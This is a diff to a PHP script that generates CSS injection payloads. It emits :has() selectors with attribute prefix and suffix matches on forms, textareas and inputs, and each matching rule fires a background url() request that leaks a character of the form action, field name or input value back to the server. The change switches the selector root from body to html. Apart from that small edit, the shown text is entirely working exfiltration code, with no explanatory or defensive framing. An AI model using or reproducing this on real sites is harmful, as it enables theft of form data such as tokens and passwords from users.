@@ -16,14 +16,14 @@ function escapeCSS($str) {
 function discoverForms() {
     $css = '';
     for($i=1;$i<=MAX_FORMS;$i++) {
-        $css .= 'body:has(form:nth-of-type('.$i.')){--formCount: url(/?formCount='.$i.');}'."\n";
+        $css .= 'html:has(form:nth-of-type('.$i.')){--formCount: url(/?formCount='.$i.');}'."\n";
     }
     foreach(CHARS as $chr) {
         for($i=1;$i<=MAX_FORMS;$i++) {
-            $css .= 'body:has(form[action^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--form'.$i.'ActionBegins: url(/?form'.$i.'ActionBegins='.urlencode($chr).');}'."\n";
+            $css .= 'html:has(form[action^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--form'.$i.'ActionBegins: url(/?form'.$i.'ActionBegins='.urlencode($chr).');}'."\n";
         }
         for($i=1;$i<=MAX_FORMS;$i++) {
-            $css .= 'body:has(form[action$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--form'.$i.'ActionEnds: url(/?form'.$i.'ActionEnds='.urlencode($chr).');}'."\n";
+            $css .= 'html:has(form[action$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--form'.$i.'ActionEnds: url(/?form'.$i.'ActionEnds='.urlencode($chr).');}'."\n";
         }
     }
     return $css;
@@ -31,16 +31,16 @@ function discoverForms() {
 function discoverTextareas() {
     $css = '';
     for($i=1;$i<=MAX;$i++) {
-        $css .= 'body:has(textarea:nth-of-type('.$i.')){--textareaCount: url(/?textareaCount='.$i.');}'."\n";
+        $css .= 'html:has(textarea:nth-of-type('.$i.')){--textareaCount: url(/?textareaCount='.$i.');}'."\n";
     }
     foreach(CHARS as $chr) {
         for($i=1;$i<=MAX;$i++) {
-            $css .= 'body:has(textarea[name^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--textarea'.$i.'NameBegins: url(/?input'.$i.'NameBegins='.urlencode($chr).');}'."\n";
+            $css .= 'html:has(textarea[name^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--textarea'.$i.'NameBegins: url(/?input'.$i.'NameBegins='.urlencode($chr).');}'."\n";
         }
     }
     foreach(CHARS as $chr) {
         for($i=1;$i<=MAX;$i++) {
-            $css .= 'body:has(textarea[name$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--textarea'.$i.'NameEnds: url(/?input'.$i.'NameEnds='.urlencode($chr).');}'."\n";
+            $css .= 'html:has(textarea[name$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--textarea'.$i.'NameEnds: url(/?input'.$i.'NameEnds='.urlencode($chr).');}'."\n";
         }
     }
     return $css;
@@ -48,26 +48,26 @@ function discoverTextareas() {
 function discoverInputs() {
     $css = '';;
     for($i=1;$i<=MAX;$i++) {
-        $css .= 'body:has(input:nth-of-type('.$i.')){--inputCount: url(/?inputCount='.$i.');}'."\n";
+        $css .= 'html:has(input:nth-of-type('.$i.')){--inputCount: url(/?inputCount='.$i.');}'."\n";
     }
     foreach(CHARS as $chr) {
         for($i=1;$i<=MAX;$i++) {
-            $css .= 'body:has(input[value^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'ValueBegins: url(/?input'.$i.'ValueBegins='.urlencode($chr).');}'."\n";
+            $css .= 'html:has(input[value^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'ValueBegins: url(/?input'.$i.'ValueBegins='.urlencode($chr).');}'."\n";
         }
     }
     foreach(CHARS as $chr) {
         for($i=1;$i<=MAX;$i++) {
-            $css .= 'body:has(input[value$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'ValueEnds: url(/?input'.$i.'ValueEnds='.urlencode($chr).');}'."\n";
+            $css .= 'html:has(input[value$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'ValueEnds: url(/?input'.$i.'ValueEnds='.urlencode($chr).');}'."\n";
         }
     }
     foreach(CHARS as $chr) {
         for($i=1;$i<=MAX;$i++) {
-            $css .= 'body:has(input[name^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'NameBegins: url(/?input'.$i.'NameBegins='.urlencode($chr).');}'."\n";
+            $css .= 'html:has(input[name^="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'NameBegins: url(/?input'.$i.'NameBegins='.urlencode($chr).');}'."\n";
         }
     }
     foreach(CHARS as $chr) {
         for($i=1;$i<=MAX;$i++) {
-            $css .= 'body:has(input[name$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'NameEnds: url(/?input'.$i.'NameEnds='.urlencode($chr).');}'."\n";
+            $css .= 'html:has(input[name$="'.escapeCSS($chr).'"]:nth-of-type('.$i.')){--input'.$i.'NameEnds: url(/?input'.$i.'NameEnds='.urlencode($chr).');}'."\n";
         }
     }
     return $css;
@@ -127,7 +127,7 @@ function generateVariables() {
         echo discoverTextareas();
         echo discoverInputs();
         ?>    
-        body {
+        html {
             background:var(--inputCount,none),var(--formCount,none),var(--textareaCount,none),
             <?php
             echo generateVariables() . ";";
